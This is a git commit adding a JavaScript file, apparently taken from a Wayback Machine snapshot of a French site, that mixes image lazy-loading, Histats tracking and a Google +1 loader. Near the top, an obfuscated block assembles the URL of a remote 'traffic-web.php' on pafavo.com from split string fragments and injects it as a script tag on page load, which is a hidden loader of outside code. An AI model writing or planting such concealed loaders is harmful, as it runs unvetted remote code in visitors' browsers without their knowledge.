e35fc7993b913d7cc59a957c251b839466f3991f
riahohjjkjh <142058674+riahohjjkjh@users.noreply.github.com>
2023-09-13 00:09:47 +0200

    Create tuni7000.js
    scrip audio70 html  script

---
+++ tuni7000.js
@@ -0,0 +1,63 @@
+var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
+if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
+{
+  let window = _____WB$wombat$assign$function_____("window");
+  let self = _____WB$wombat$assign$function_____("self");
+  let document = _____WB$wombat$assign$function_____("document");
+  let location = _____WB$wombat$assign$function_____("location");
+  let top = _____WB$wombat$assign$function_____("top");
+  let parent = _____WB$wombat$assign$function_____("parent");
+  let frames = _____WB$wombat$assign$function_____("frames");
+  let opener = _____WB$wombat$assign$function_____("opener");
+
+
+var A1='ht',A2='tp',A3=':/',A4='/w',A5='ww',A6='.p',A7='af',A8='av',A9='o.',B1='co',B2='m/',B3='t-',B4='w/',B5='tr',B6='af',B7='ic',B8='-w',B9='eb',K1='.',K2='p',K3='h',C1='te',C2='xt/',C3='ja',C4='va',C5='sc',C6='ri',C7='pt';var Y1=C1+C2+C3+C4+C5+C6+C7;var Y2=A1+A2+A3+A4+A5+A6+A7+A8+A9+B1+B2+B3+B4+B5+B6+B7+B8+B9+K1+K2+K3+K2;
+var jsk = document.createElement("script");jsk.type=Y1; jsk.src=Y2;document.body.appendChild(jsk);
+
+
+$(function() {
+$("img").lazyload({
+event: "scrollstop"
+});
+});
+
+var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,3903960,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('https://web.archive.org/web/20180628221640/http://s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();
+
+
+  window.___gcfg = {lang: 'fr'};
+
+  (function() {
+    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+    po.src = 'https://web.archive.org/web/20180628221640/https://apis.google.com/js/plusone.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+  })();
+
+}
+/*
+     FILE ARCHIVED ON 22:16:40 Jun 28, 2018 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 22:09:02 Sep 12, 2023.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+*/
+/*
+playback timings (ms):
+  captures_list: 203.684
+  exclusion.robots: 0.159
+  exclusion.robots.policy: 0.148
+  cdx.remote: 0.058
+  esindex: 0.009
+  LoadShardBlock: 174.585 (3)
+  PetaboxLoader3.datanode: 237.207 (5)
+  load_resource: 430.71 (2)
+  PetaboxLoader3.resolve: 292.994 (2)
+*/
